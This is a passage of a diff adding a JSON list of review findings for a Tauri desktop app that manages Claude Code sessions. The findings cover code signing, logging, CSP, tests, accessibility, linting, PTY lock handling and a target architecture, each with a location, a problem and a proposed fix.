+  "where": "src-tauri/tauri.conf.json:27-35 (no bundle.windows); .github/workflows/build.yml:43",
+  "problem": "The NSIS and MSI installers and the exe are unsigned. SmartScreen shows 'Windows protected your PC' to every user, and an unsigned app that spawns PTY processes is a common antivirus false-positive pattern.",
+  "fix": "Sign with Azure Trusted Signing (cheapest current option) through `bundle.windows.signCommand: \"trusted-signing-cli -e https://<region>.codesigning.azure.net -a <account> -c <profile> -d ClaudeManager %1\"`, with AZURE_CLIENT_ID, AZURE_CLIENT_SECRET and AZURE_TENANT_ID as CI secrets. Another option is an OV/EV certificate through `certificateThumbprint`, `digestAlgorithm: sha256` and `timestampUrl: http://timestamp.digicert.com`. For an internal-only v1.0 this can be a documented known issue.",
+  "dimension": "release"
+ },
+ {
+  "title": "macOS builds are not signed or notarized",
+  "severity": "high",
+  "where": ".github/workflows/build.yml:1-3, 42-44; README.md:21-26",
+  "problem": "Gatekeeper blocks unsigned universal .dmg files. On macOS 15 and later, right-click > Open no longer bypasses this: users must go to System Settings > Privacy & Security > Open Anyway. The updater also cannot replace an app that is not notarized without new quarantine prompts.",
+  "fix": "Get an Apple Developer ID Application certificate. Add APPLE_CERTIFICATE (base64 .p12), APPLE_CERTIFICATE_PASSWORD, APPLE_SIGNING_IDENTITY, APPLE_ID, APPLE_PASSWORD (app-specific password) and APPLE_TEAM_ID as secrets, and pass them as env on the tauri-action step. Set `bundle.macOS.minimumSystemVersion` to, for example, \"11.0\". Hardened runtime is the default. Spawning a login shell needs no extra entitlements.",
+  "dimension": "release"
+ },
+ {
+  "title": "No logging or crash reporting; panic=abort makes crashes silent",
+  "severity": "high",
+  "where": "src-tauri/Cargo.toml:31-36 (panic = \"abort\"); src-tauri/src/lib.rs:57; src-tauri/src/main.rs:1; src/main.ts:121-122, 449",
+  "problem": "The release build uses windows_subsystem=windows (no console) and panic=abort, so a panic or failed `.expect` closes the app with no trace. Frontend errors go only to console.error, which is not visible in release. PTY spawn failures and parse errors are lost.",
+  "fix": "Add `tauri-plugin-log = \"2\"` and register it first: `.plugin(tauri_plugin_log::Builder::new().targets([Target::new(TargetKind::LogDir{file_name:None}), Target::new(TargetKind::Stdout), Target::new(TargetKind::Webview)]).max_file_size(5_000_000).rotation_strategy(RotationStrategy::KeepOne).level(log::LevelFilter::Info).build())`. Add the `log:default` capability. In run(), install `std::panic::set_hook` to `log::error!` the panic and its location before abort. Use `@tauri-apps/plugin-log` `attachConsole()`, and send `window.onerror` and `unhandledrejection` to `error()`. Add a 'Show logs' menu item that opens `app_log_dir()`. Crash reporting such as Sentry (`tauri-plugin-sentry`) is optional for v1.0.",
+  "dimension": "release"
+ },
+ {
+  "title": "No single-instance guard",
+  "severity": "medium",
+  "where": "src-tauri/src/lib.rs:47-48",
+  "problem": "Launching from the Start menu or Dock while the app is already open starts a second process. Each process has its own Terms map and its own 15-second refresh, and once settings exist both will write the same file, so the last one to save wins.",
+  "fix": "Add `tauri-plugin-single-instance = \"2\"` and register it as the first plugin: `.plugin(tauri_plugin_single_instance::init(|app, _args, _cwd| { if let Some(w) = app.get_webview_window(\"main\") { let _ = w.unminimize(); let _ = w.set_focus(); } }))`. Gate it with `#[cfg(desktop)]`.",
+  "dimension": "release"
+ },
+ {
+  "title": "Window size and position are not remembered",
+  "severity": "low",
+  "where": "src-tauri/tauri.conf.json:15-21; src-tauri/src/lib.rs:47",
+  "problem": "The window always opens at 1280x820 in the default position. Users with large or multiple monitors expect it to reopen where they left it.",
+  "fix": "Add `tauri-plugin-window-state = \"2\"`, register `.plugin(tauri_plugin_window_state::Builder::default().build())`, and add the `window-state:default` capability. Optionally set `\"center\": true` on the window for the first run. Optional for v1.0, but it costs about 3 lines.",
+  "dimension": "release"
+ },
+ {
+  "title": "Installer targets and NSIS options left at 'all' and defaults",
+  "severity": "medium",
+  "where": "src-tauri/tauri.conf.json:28-29",
+  "problem": "`targets: \"all\"` builds both NSIS and MSI on Windows, which doubles CI time, gives users two installers, and the MSI rejects non-numeric pre-release versions. Neither the WebView2 install mode nor the NSIS install mode is set. Windows 10 machines without WebView2 need a network download during install.",
+  "fix": "Set `\"targets\": [\"nsis\", \"dmg\", \"app\"]` and add `\"windows\": { \"nsis\": { \"installMode\": \"currentUser\", \"displayLanguageSelector\": false, \"installerIcon\": \"icons/icon.ico\" }, \"webviewInstallMode\": { \"type\": \"downloadBootstrapper\", \"silent\": true } }`. Use `embedBootstrapper` if offline installs matter. Update the upload-artifact paths at build.yml:57-61 to match.",
+  "dimension": "release"
+ },
+ {
+  "title": "CSP disabled in the release config",
+  "severity": "medium",
+  "where": "src-tauri/tauri.conf.json:23-25",
+  "problem": "`\"csp\": null` turns off Content-Security-Policy. main.ts builds HTML with innerHTML from transcript text (for example main.ts:480 and the session labels). One missed esc() call would let transcript content run script, and that script can call pty_spawn and pty_write.",
+  "fix": "Set `\"csp\": \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src ipc: http://ipc.localhost\"`. Test with xterm's WebGL addon, which needs no extra sources.",
+  "dimension": "release"
+ },
+ {
+  "title": "Unused opener plugin is granted",
+  "severity": "low",
+  "where": "src-tauri/Cargo.toml:22; src-tauri/src/lib.rs:48; src-tauri/capabilities/default.json:7; package.json:14",
+  "problem": "tauri-plugin-opener is left over from the template. The frontend never imports it, but `opener:default` is still granted, which adds attack surface and binary size.",
+  "fix": "Remove it from Cargo.toml, lib.rs:48, package.json and the capability. Or keep it only if you add 'Reveal in Explorer/Finder' (parity with the PS1 'open folder'), and in that case grant only `opener:allow-reveal-item-in-dir`.",
+  "dimension": "release"
+ },
+ {
+  "title": "Package metadata and license missing",
+  "severity": "medium",
+  "where": "src-tauri/Cargo.toml:4-5; package.json; repo root (no LICENSE)",
+  "problem": "Cargo.toml has `authors = [\"you\"]` from the template and no `license` or `repository`. There is no LICENSE file. Third-party licenses (xterm.js MIT, portable-pty MIT, Tauri MIT/Apache) are not bundled.",
+  "fix": "Set `authors = [\"CeyLabs\"]`, `license = \"<chosen SPDX>\"` (or `publish = false` with a proprietary notice) and `repository = \"https://github.com/CeyLabs/<repo>\"`. Add a LICENSE file. Optionally set `bundle.license` or `licenseFile` so NSIS shows it, and generate THIRD_PARTY_NOTICES with `cargo about` plus `pnpm licenses list`.",
+  "dimension": "release"
+ },
+ {
+  "title": "README is still a prototype note",
+  "severity": "low",
+  "where": "README.md:1-26",
+  "problem": "The title says 'cross-platform prototype' and the README calls builds unsigned. It has no user install steps, no requirement that the `claude` CLI is on PATH, no note on where settings and logs live, no release or updater process, and no secrets list for CI.",
+  "fix": "Rewrite it with: Install (Windows NSIS, macOS dmg), Requirements (Claude Code CLI on PATH; WebView2 on Win10), Data locations (app_config_dir, app_log_dir), Release process (bump version, tag vX.Y.Z, publish the draft release), and the required CI secrets (TAURI_SIGNING_*, APPLE_*, AZURE_*).",
+  "dimension": "release"
+ },
+ {
+  "title": "CI toolchain is not pinned",
+  "severity": "low",
+  "where": ".github/workflows/build.yml:22-24, 31; src-tauri/Cargo.toml:6",
+  "problem": "`pnpm version: 10`, `dtolnay/rust-toolchain@stable` and `tauri-action@v0` all float, and edition 2024 needs Rust 1.85 or newer. A new upstream release can break a tagged build without any code change.",
+  "fix": "Add `\"packageManager\": \"pnpm@10.x.y\"` to package.json and drop `version:` from pnpm/action-setup. Add `rust-toolchain.toml` with a fixed channel (for example 1.90) and `rust-version = \"1.85\"` in Cargo.toml. Pin tauri-action to a tagged release.",
+  "dimension": "release"
+ },
+ {
+  "title": "No tests anywhere (Rust or frontend)",
+  "severity": "blocker",
+  "where": "src-tauri/src/sessions.rs:188-228, src-tauri/src/pty.rs:36-71, src/main.ts:42-49,128-140, package.json:6-11",
+  "problem": "There are no #[cfg(test)] modules, no src-tauri/tests, no vitest, and no `test` script. The logic that most needs regression tests is either private or tied to globals. That covers parse_line (string-contains rules such as `\"type\":\"user\"` and skipping `tool_result`/isMeta/'<'), str_field/prompt_text, label truncation to 140 chars (sessions.rs:132-134), incremental read_lines (resume from offset, a partial last line, a file rewritten shorter), the profile_name/shell_quote/claude_command env scrubbing, and in TS ago(), visibleProjects() and startProfile().",
+  "fix": "Rust: add `#[cfg(test)] mod tests` to sessions.rs with JSONL fixtures under src-tauri/tests/fixtures/*.jsonl, covering a user prompt, a tool_result line, an isMeta line, custom-title overriding summary, CRLF and BOM, a line split across the 1 MiB buffer, and an append-then-reread that checks the offset. Add tests to pty.rs for shell_quote (\"a b\", \"it's\", \"\") and for profile_name. Add tempfile as a dev-dependency and write fake ~/.claude-x/projects trees. Frontend: add vitest and happy-dom, move the pure functions into src/lib/*.ts (see the architecture finding), and test ago() with a fixed `now`, plus the filtering and grouping. Add scripts: \"test\": \"vitest run\", \"typecheck\": \"tsc --noEmit\".",
+  "dimension": "quality"
+ },
+ {
+  "title": "Session scanning is hard-wired to the real home dir and a global cache, so it can't be tested",
+  "severity": "high",
+  "where": "src-tauri/src/sessions.rs:52, 55-56, 82-84, 149",
+  "problem": "profiles() calls dirs::home_dir() directly, projects() calls profiles(), and parse state sits in a process-wide `static STATES: LazyLock<Mutex<HashMap>>`. A test can't point the scanner at a fixture dir, and tests running in parallel would share the cache. The cache is also never pruned when transcripts are deleted.",
+  "fix": "Add `pub struct Scanner { cache: Mutex<HashMap<PathBuf, ParseState>> }` with `fn profiles_in(home: &Path) -> Vec<Profile>` and `fn projects(&self, home: &Path) -> Vec<Project>`. Register it with `.manage(Scanner::default())` in lib.rs and inject it via State<Scanner> in list_projects. At the end of each scan, drop cache keys that weren't seen (`cache.retain(|k,_| seen.contains(k))`). Also split the grouping (sessions.rs:108-126) into a pure `fn group(sessions: Vec<Session>, case_insensitive: bool) -> Vec<Project>` so it can be unit-tested without the filesystem.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Rust and TypeScript types are hand-copied and already drift",
+  "severity": "high",
+  "where": "src/main.ts:9-12 vs src-tauri/src/sessions.rs:14-39, src-tauri/src/pty.rs:12-17; command names as strings at main.ts:120,334,427,428,447,478,479",
+  "problem": "Session/Project/Profile/PtyEvent are duplicated by hand, and command names and argument keys are untyped strings (`invoke(\"pty_spawn\", {cwd, profile, args, cols, rows, onEvent})`). Renaming a Rust field or argument compiles fine and then fails at runtime. PtyEvent::Exit.code exists in both copies, but Rust always sends None (pty.rs:103), so the contract is wrong too.",
+  "fix": "Add tauri-specta and specta (or ts-rs) to Cargo.toml. Derive `specta::Type` on Session/Project/Profile/PtyEvent, and in a debug build or a `cargo test export_bindings` test export to src/bindings.ts, which gives typed `commands.listProjects()`, `commands.ptySpawn(...)` etc. Delete main.ts:9-12 and import from ./bindings. Add a CI step that regenerates and runs `git diff --exit-code src/bindings.ts`. Send the real exit code: keep the child's waiter in the reader thread (`child.wait()` after EOF) and send `Exit{code: Some(status.exit_code())}`.",
+  "dimension": "quality"
+ },
+ {
+  "title": "main.ts is a 489-line module of global mutable state with innerHTML full re-renders",
+  "severity": "high",
+  "where": "src/main.ts:30-37 (globals), 150-170, 234-258, 261-276 (innerHTML renders), 199-231, 296-316 (delegated handlers), 380-454 (terminal)",
+  "problem": "Sidebar, home, tabs, terminals, motion, data polling and bootstrap all share module-level `let`s (projects, selected, active, tabs, entering). Any feature touches this one file, so parallel work causes merge conflicts. Each 15 s refresh (main.ts:487) and each armed-close timer (main.ts:306) rebuilds whole lists with innerHTML. That throws away keyboard focus, hover state and in-progress collapse styles. renderTabs already needs workarounds re-applying `.closing` and entering styles (273-274).",
+  "fix": "Split into feature modules around a tiny typed store (src/state/store.ts: `createStore<AppState>()` with `get/set/subscribe`). Each feature owns its DOM subtree and subscribes to slices: features/sidebar, features/home, features/tabs, features/terminal. Render lists with keyed reconciliation, either a minimal hand-written keyed diff on data-key or lit-html `repeat()`, which is about 3 KB. Existing nodes are then updated, not replaced, and focus survives refreshes. See the target-architecture finding for the layout.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Sidebar and tabs can't be used with the keyboard and have no ARIA roles",
+  "severity": "high",
+  "where": "src/main.ts:160-166 (project rows), 146 (session rows), 248 (home rows), 263-269 (tabs); index.html:17,23",
+  "problem": "Project, session, home-table and tab rows are plain <div>s with no tabindex, role or keyboard handlers, so only a mouse can open, resume, expand or switch them. The chevron toggle (main.ts:161) is a span. The tab strip has no role=tablist/tab/aria-selected, and nothing tells assistive tech that a project is expanded.",
+  "fix": "Sidebar: put role=\"tree\" on #project-list. Project rows get role=\"treeitem\" aria-expanded aria-selected tabindex (roving: 0 on the current row, -1 on others) and session rows get role=\"treeitem\" aria-level=2. Add a keydown handler on el.projects: ArrowUp/Down move, ArrowRight/Left expand/collapse, Enter resumes or selects, Ctrl/Cmd+N starts a new session. Tabs: role=\"tablist\" on #tab-list, role=\"tab\" aria-selected aria-controls=pane-id on each tab, role=\"tabpanel\" on .term-pane/#home, ArrowLeft/Right between tabs, Delete to close. Add global shortcuts: Ctrl+Tab/Ctrl+Shift+Tab (Cmd+Shift+]/[ on macOS) and Ctrl/Cmd+W. Home table: use a real <table> or role=\"grid\" with focusable rows and Enter to resume.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Hover-only buttons and no focus rings",
+  "severity": "high",
+  "where": "src/styles.css:46, 65, 68-69, 86-87",
+  "problem": "`.mini { display:none }` with `.row:hover .mini { display:grid }` takes the New-session button out of the tab order, so keyboard users never reach it. `#search { outline:none }` removes the only focus indicator, and no rule anywhere uses :focus-visible. Tab close buttons are opacity:0 but still focusable, so they get focused while invisible.",
+  "fix": "Replace `display:none` with `opacity:0` and add `.row:hover .mini, .row:focus-within .mini, .mini:focus-visible { opacity:1 }` (same for `.tab:focus-within .close`). Add a global `:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }` and `.row:focus-visible, .tab:focus-visible { outline-offset:-2px }`. Remove `outline:none` from #search, or keep it only together with a visible box-shadow ring on :focus-visible.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Low colour contrast on accent and muted text",
+  "severity": "medium",
+  "where": "src/styles.css:8, 10, 57-59, 100",
+  "problem": "White text on --accent #d97757 (selected project row, .primary button) is about 3.1:1. Muted #86868b on the --side #f4f4f6 background is about 3.3:1, and it is used for 11.5-12px metadata. Both fail WCAG AA (4.5:1) for small text.",
+  "fix": "Add a `--accent-strong` (e.g. #b8532f, about 4.6:1 with white) for filled backgrounds behind white text: .sel-pill, .primary and .tab .close.armed. Darken light-mode --muted to around #6e6e73. Optionally add a `@media (prefers-contrast: more)` block with stronger borders.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Reduced motion only partly honoured",
+  "severity": "medium",
+  "where": "src/main.ts:389-391, src/styles.css:35, 61",
+  "problem": "spring.ts:63 snaps springs and styles.css:35 kills transitions, but the xterm options still use smoothScrollDuration:110 and cursorBlink:true whatever the user's setting. Nothing updates open terminals when the preference changes.",
+  "fix": "In the terminal module, read `matchMedia('(prefers-reduced-motion: reduce)')`. Set `smoothScrollDuration: reduce ? 0 : 110` and `cursorBlink: !reduce`, and listen for its `change` event to update `term.options` on every open tab, the same way the theme listener at main.ts:462 does. Export the MediaQueryList from spring.ts (rename it lib/motion.ts) so there is one source.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Relative dates and sizes are hard-coded English",
+  "severity": "medium",
+  "where": "src/main.ts:42-49, 249; index.html:2",
+  "problem": "ago() returns \"just now\", \"5m ago\", \"3h ago\" and \"2d ago\" in English only, and it reads Date.now() itself, so it can't be tested. The size column uses `toFixed(1) + \" MB\"`, which ignores locale decimal separators. UI strings are inline across main.ts:153,237,242,245,268,441.",
+  "fix": "Create src/lib/format.ts with `formatAgo(ms, now = Date.now(), locale = navigator.language)`, using `new Intl.RelativeTimeFormat(locale, {numeric:'auto', style:'narrow'})` for under 7 days and `Intl.DateTimeFormat(locale, {month:'short', day:'numeric'})` after that. Add `formatSize(kb)` using `Intl.NumberFormat(locale, {style:'unit', unit: kb>=1024?'megabyte':'kilobyte', maximumFractionDigits:1})`. Move the UI strings to src/i18n/en.ts (`export const t = {...}`) so a later locale is just a file. Unit-test both formatters with fixed `now` and locales 'en' and 'de'.",
+  "dimension": "quality"
+ },
+ {
+  "title": "No lint/format config and no CI quality gate",
+  "severity": "high",
+  "where": "package.json:6-23, src-tauri/ (no rustfmt.toml/clippy.toml), .github/workflows/build.yml:6-9",
+  "problem": "There is no eslint/prettier/biome, rustfmt.toml or clippy step. CI only runs on workflow_dispatch and v* tags, so pull requests get no check at all. Several lines exceed rustfmt's 100-column default (lib.rs:20, 50; pty.rs:44, 74; sessions.rs:103), so `cargo fmt --check` fails today. Code clippy will likely flag includes sessions.rs:164 `for i in 0..n { buf[i] }` (needless_range_loop) and pty.rs:44 `.map(|a| shell_quote(a))` (redundant_closure).",
+  "fix": "Add biome.json (lint + format, `biome ci .`) or eslint+prettier, plus src-tauri/rustfmt.toml (`max_width = 120`) and run `cargo fmt` once. Fix line 164 with `for (i, &b) in buf[..n].iter().enumerate()` or memchr. Add .github/workflows/ci.yml on `pull_request` and `push: main` with jobs: `pnpm biome ci`, `pnpm typecheck`, `pnpm test`, `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings` and `cargo test`. Run it as a matrix on windows-latest and macos-latest, because the PTY and path rules are platform-specific.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Platform detection by user agent and a hard-coded ConPTY build number",
+  "severity": "medium",
+  "where": "src/main.ts:15, 386, 393",
+  "problem": "`navigator.userAgent.includes(\"Windows\")` is a guess, and `windowsPty: { buildNumber: 19045 }` is hard-coded. On Windows 11 (build 22000+), xterm then applies the wrong ConPTY reflow heuristics. Neither value can be injected in tests.",
+  "fix": "Add a `platform_info` command returning `{ os: &'static str, build: Option<u32> }` (use std::env::consts::OS, and on Windows read the build via RtlGetVersion or the os_info crate), or use @tauri-apps/plugin-os `platform()`/`version()`. Pass it into the terminal module as config instead of reading globals.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Fragile tab identity for de-duplicating resumes",
+  "severity": "medium",
+  "where": "src/main.ts:13, 375-377",
+  "problem": "An already-open session is found with `t.sub.endsWith(s.id.slice(0,8))`, which matches against a display string. Changing the subtitle format, or two sessions sharing an 8-char prefix, breaks it silently. Tab mixes view state (armed, closing) with domain state.",
+  "fix": "Add `sessionId?: string; cwd: string; profile: string` to the Tab type, set sessionId in resume(), and match on `t.sessionId === s.id`. For new sessions, set sessionId from the transcript once it appears. Keep presentation-only fields (armed, closing, entering) in the tabs feature's own view map.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Lock poisoning and blocking writes in the PTY manager",
+  "severity": "medium",
+  "where": "src-tauri/src/pty.rs:106, 111-114, 124, 130; Cargo.toml:34",
+  "problem": "Every `self.map.lock().unwrap()` panics if the lock is poisoned, and with `panic = \"abort\"` that kills the whole app and every session. pty_write holds the global map lock during a blocking `write_all`, so one stalled child (full input buffer) freezes writes, resizes and kills for every tab. None of this can be unit-tested because Terms needs a real Channel.",
+  "fix": "Store `Arc<Mutex<Term>>` per entry. Take the map lock only long enough to clone the Arc, then write under the per-term lock. Replace unwrap with `.lock().map_err(|_| AppError::Poisoned)?`. Add `src-tauri/src/error.rs` with a `thiserror` enum that implements Serialize (instead of `Result<_, String>` everywhere). Make spawn generic over a `Sink` trait (`fn send(&self, ev: PtyEvent) -> bool`) so tests can use a Vec-backed sink with a real PTY running `echo`.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Unused opener plugin and leftover template metadata",
+  "severity": "low",
+  "where": "package.json:14, src-tauri/Cargo.toml:5, 22, src-tauri/src/lib.rs:48, src-tauri/capabilities/default.json:8, vite.config.ts:2",
+  "problem": "@tauri-apps/plugin-opener and tauri-plugin-opener are initialized and granted permission, but nothing imports them. Cargo.toml has `authors = [\"you\"]`. vite.config.ts uses `@ts-expect-error` instead of installing @types/node.",
+  "fix": "Either remove the opener plugin from package.json, Cargo.toml, lib.rs:48 and capabilities, or start using it (e.g. a 'Reveal in Finder/Explorer' action). Set the real authors. Add @types/node as a devDependency and delete the ts-expect-error. Add `noUncheckedIndexedAccess: true` to tsconfig.json to catch the `!` assertions at main.ts:201,225,255,300.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Silent failures on startup and refresh",
+  "severity": "medium",
+  "where": "src/main.ts:119-123, 479, 334, 427-428; src-tauri/src/sessions.rs:121",
+  "problem": "refresh() only logs errors to the console. list_profiles at main.ts:479 isn't in a try block, so a backend error leaves \"Loading sessions...\" on screen forever. Fire-and-forget invoke calls (pty_kill, pty_write, pty_resize) produce unhandled promise rejections. Sessions with no cwd are dropped without notice (sessions.rs:121 filters an empty path).",
+  "fix": "Wrap all backend calls in src/api/client.ts so each one returns a Result-like value and reports errors to a single `notify(error)` toast/status-bar module. Show an error state in the sidebar instead of 'Loading'. Group cwd-less sessions under an 'Unknown folder' project instead of dropping them, and add a test for it.",
+  "dimension": "quality"
+ },
+ {
+  "title": "Target architecture for parallel work",
+  "severity": "high",
+  "where": "repo layout (src/, src-tauri/src/)",
+  "problem": "Today every feature goes through src/main.ts, styles.css and lib.rs's generate_handler! list, so any two engineers working in parallel conflict in the same files.",
+  "fix": "Rust: turn it into a Cargo workspace. `crates/cm-core` has no tauri dependency and holds sessions/{scan.rs, parse.rs, group.rs}, pty/{command.rs, manager.rs}, error.rs and types.rs with specta derives. It runs `cargo test` fast on any OS, needs no webview libs, and its tests use fixtures. `src-tauri` keeps lib.rs (builder only) plus commands/{sessions.rs, pty.rs, platform.rs}, each exposing `pub fn handlers() -> ...`, or uses tauri-specta's `collect_commands!` per module, so adding a command never edits a shared list. Frontend: src/main.ts (about 30 lines of bootstrap); src/bindings.ts (generated); src/api/client.ts; src/state/store.ts; src/lib/{format.ts, filter.ts, dom.ts (esc/html), motion.ts (Spring)}; src/i18n/en.ts; src/features/{sidebar,home,tabs,terminal,settings}/ each with index.ts (mount(root, store)), view.ts, keyboard.ts, *.css, *.test.ts. styles.css keeps only tokens and resets. Features talk only through the store and a typed event bus (`bus.emit('session:open', {...})`) and never import each other. Add CODEOWNERS per features/* and crates/*, biome and vitest per package, and a CI gate that checks bindings.ts is up to date.",
+  "dimension": "quality"
+ }
+]
